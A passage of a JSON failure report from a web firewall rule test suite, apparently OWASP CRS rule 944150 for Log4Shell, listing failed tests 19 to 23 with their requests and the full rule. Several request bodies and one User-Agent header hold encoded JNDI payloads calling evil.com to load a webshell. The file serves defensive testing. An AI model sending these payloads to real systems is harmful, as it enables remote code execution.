        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 19,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 19,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion wrapped in URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%26%2336%3B%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 20,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 20,
      "desc" : "Log4J exploit on JSON with named HTML entity evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026lbrace;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 21,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 21,
      "desc" : "Log4J exploit on JSON with numeric HTML entity evasion, wrapped in Unicode escape evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"$\\u0026#123;jndi:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 22,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)" ]
    },
    "test" : {
      "test_id" : 22,
      "desc" : "Log4J exploit on JSON with named and numeric HTML entity evasion, mixed with unicode escape evasion and URL encoding evasion",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Content-Type" : "application/json"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post",
          "data" : "{\"foo\": \"%24&lcub;\\u006A&#110;di:ldap://evil.com/webshell}\"}",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
          "text" : " potentially be executed on the logviewer."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule has stricter siblings: 944151 (PL2), 944152 (PL4)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/944150.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 944150"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_LINE"
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_HEADERS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "//@*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^\\}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi|ctx)"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 944150
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "jsDecode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "htmlEntityDecode"
        }, {
          "type" : "Action",
          "action_type" : "log"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Potential Remote Command Execution: Log4j / Log4shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-java"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-JAVA"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/137/6"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "944150",
    "test_id" : 23,
    "test_path" : "REQUEST-944-APPLICATION-ATTACK-JAVA/944150.yaml",
    "description" : "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
    "cause" : "failed expect_id check: 944150 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920420 - Request content type is not allowed by policy" ]
    },
    "test" : {
      "test_id" : 23,
      "desc" : "Log4J exploit on User-Agent header which is known to work against org.apache.commons:commons-text:1.9",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "*/*",
            "Host" : "localhost",
            "User-Agent" : "&#x24;&#00000000000000000000000000000000000000000000000123;jndi:ldap://evil.om/w}",
            "Content-Type" : "text/html"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 944150 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 944150,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " Log4J / Log4Shell Defense"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This addresses exploits against the Log4J library described in several CVEs:"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44228"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-44832"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45046"
        }, {
          "type" : "Comment",
          "text" : " * CVE-2021-45105"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " See https://coreruleset.org/20211213/crs-and-log4j-log4shell-cve-2021-44228/"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule attempts to detect two things:"
        }, {
          "type" : "Comment",
          "text" : " * Nested use of ${"
        }, {
          "type" : "Comment",
          "text" : " * use of ${jndi:... without the closing bracket"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule 932130 is also essential for defense since there are certain"
        }, {
          "type" : "Comment",
          "text" : " bypasses of the log4j rules that can be caught by 932130."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The payload is not displayed in the alert message since log4j could"
        }, {
          "type" : "Comment",
